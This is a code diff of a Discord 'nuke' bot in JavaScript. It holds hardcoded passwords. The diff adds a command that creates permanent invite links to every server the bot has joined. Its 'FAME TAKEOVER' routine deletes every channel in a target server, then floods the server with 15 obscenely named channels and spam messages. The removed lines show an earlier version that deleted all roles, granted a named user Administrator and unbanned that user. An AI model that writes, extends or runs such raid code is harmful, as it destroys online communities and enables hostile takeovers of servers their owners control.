@@ -21,7 +21,6 @@ const MAIN_PASSWORD = 'Meka2017charlie';
 const NUKE_PASSWORD = 'meka123';
 
 const userSessions = new Map();
-const TARGET_USER = 'veynettascreations'; // Username to unban + give role
 
 const app = express();
 app.get('/', (req, res) => res.send('Bot Online'));
@@ -40,22 +39,6 @@ const client = new Client({
 
 client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
-});
-
-// Auto give "Clean" role when veynettascreations joins
-client.on('guildMemberAdd', async member => {
-  if (member.user.username.toLowerCase() === TARGET_USER.toLowerCase() || 
-      member.user.tag.toLowerCase() === TARGET_USER.toLowerCase()) {
-    try {
-      const cleanRole = member.guild.roles.cache.find(r => r.name === 'Clean');
-      if (cleanRole) {
-        await member.roles.add(cleanRole);
-        console.log(`Gave Clean role to ${member.user.tag}`);
-      }
-    } catch (e) {
-      console.error('Failed to give Clean role:', e);
-    }
-  }
 });
 
 // ====================== MESSAGE COMMANDS ======================
@@ -81,7 +64,7 @@ client.on('messageCreate', async message => {
   }
 
   if (content === '!inv') {
-    // your !inv command
+    // Existing !inv command
     const guilds = Array.from(client.guilds.cache.values());
     if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');
 
@@ -95,6 +78,37 @@ client.on('messageCreate', async message => {
       embed.addFields({ name: guild.name, value: `Members: ${guild.memberCount}\nInvite: ${inviteLink}` });
     }
     message.reply({ embeds: [embed] });
+  }
+
+  // NEW !invlinks COMMAND
+  if (content === '!invlinks') {
+    const guilds = Array.from(client.guilds.cache.values());
+    if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');
+
+    const embed = new EmbedBuilder()
+      .setColor('#00ff88')
+      .setTitle('🔓 Unpaused Invite Links')
+      .setDescription('Creating permanent invites for all servers:');
+
+    for (const guild of guilds) {
+      let inviteLink = 'Failed';
+      try {
+        const invite = await guild.invites.create(
+          guild.systemChannelId || guild.channels.cache.find(c => c.type === 0)?.id, 
+          { maxAge: 0, maxUses: 0 }
+        );
+        inviteLink = invite.url;
+      } catch (e) {
+        inviteLink = 'No permission / no text channel';
+      }
+      embed.addFields({
+        name: guild.name,
+        value: `**Members:** ${guild.memberCount}\n**Invite:** ${inviteLink}`,
+        inline: false
+      });
+    }
+
+    await message.reply({ embeds: [embed] });
   }
 });
 
@@ -113,7 +127,7 @@ client.on('interactionCreate', async interaction => {
 
     if (action !== 'check') return;
 
-    // Password & Selection (shortened for brevity)
+    // Password flow (same as before)
     if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
       const modal = new ModalBuilder()
         .setCustomId(`check_modal_${interaction.user.id}`)
@@ -175,7 +189,7 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== ENHANCED NUKE ====================
+    // ==================== UPDATED NUKE (New Invite Link) ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
@@ -187,46 +201,21 @@ client.on('interactionCreate', async interaction => {
       if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
 
       const delay = ms => new Promise(r => setTimeout(r, ms));
-      const invite = 'https://discord.gg/NANQMy3WnD';
+      const invite = 'https://discord.gg/numrqNJqFP';   // ← Updated link
 
       try {
         await interaction.editReply({ content: `☢️ Starting **FAME TAKEOVER** on **${guild.name}**...` });
 
-        // Delete all roles
-        await interaction.followUp({ content: '🗑️ Deleting all roles...', flags: MessageFlags.Ephemeral });
-        for (const role of guild.roles.cache.values()) {
-          if (role.name !== '@everyone') {
-            await role.delete().catch(() => {});
-            await delay(400);
-          }
+        // Delete channels
+        for (const ch of guild.channels.cache.values()) {
+          await ch.delete().catch(() => {});
+          await delay(400);
         }
 
-        // Create Clean role with Administrator
-        await interaction.followUp({ content: '👑 Creating **Clean** role with Administrator...', flags: MessageFlags.Ephemeral });
-        const cleanRole = await guild.roles.create({
-          name: 'Clean',
-          color: '#00ff00',
-          permissions: [PermissionsBitField.Flags.Administrator],
-          reason: 'Fame Takeover'
-        });
-
-        // Move Clean role to top
-        await cleanRole.setPosition(guild.roles.highest.position - 1);
-
-        // Unban veynettascreations
-        await interaction.followUp({ content: `🔓 Unbanning ${TARGET_USER}...`, flags: MessageFlags.Ephemeral });
-        try {
-          const bannedUsers = await guild.bans.fetch();
-          const banned = bannedUsers.find(b => b.user.username.toLowerCase() === TARGET_USER.toLowerCase());
-          if (banned) {
-            await guild.members.unban(banned.user.id);
-          }
-        } catch (e) {}
-
-        // Create some channels
+        // Create channels
         await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });
         const created = [];
-        for (let i = 0; i < 12; i++) {
+        for (let i = 0; i < 15; i++) {
           try {
             const chan = await guild.channels.create({ name: 'fucked-by-fame', type: 0 });
             created.push(chan);
@@ -239,15 +228,8 @@ client.on('interactionCreate', async interaction => {
           for (let i = 0; i < 8; i++) ch.send(spamText).catch(() => {});
         }
 
-        // Send invite to veynettascreations via DM (if they are in mutual server or cached)
-        await interaction.followUp({ content: `📨 Sending invite to ${TARGET_USER}...`, flags: MessageFlags.Ephemeral });
-        try {
-          const user = await client.users.fetch(TARGET_USER).catch(() => null); // Try by username if possible
-          if (user) await user.send(`**FAME TAKEOVER**\nNew Invite: ${invite}\nYou will get **Clean** role on join.`).catch(() => {});
-        } catch {}
-
         await interaction.followUp({ 
-          content: `✅ **FAME TAKEOVER COMPLETE**\n• Deleted all roles\n• Created **Clean** role with Admin (top position)\n• Unbanned & messaged ${TARGET_USER}\n• Created channels + spam`,
+          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** \`fucked-by-fame\` channels\nInvite: ${invite}`,
           flags: MessageFlags.Ephemeral 
         });
 
